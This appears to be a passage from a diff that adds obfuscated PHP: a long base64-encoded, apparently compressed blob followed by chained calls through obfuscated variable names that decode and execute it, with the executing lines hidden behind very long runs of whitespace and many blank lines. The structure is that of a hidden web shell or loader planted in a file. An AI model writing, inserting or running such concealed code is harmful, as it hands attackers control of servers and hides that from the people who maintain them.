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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
